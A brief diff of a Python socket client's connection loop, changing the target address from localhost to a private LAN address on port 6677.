@@ -16,7 +16,7 @@ def main():
 		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		print("[+] Connecting...")
 		try:
-                    client.connect(('localhost', 6677))
+                    client.connect(('192.168.1.10', 6677))
                     break
 
 		except: 
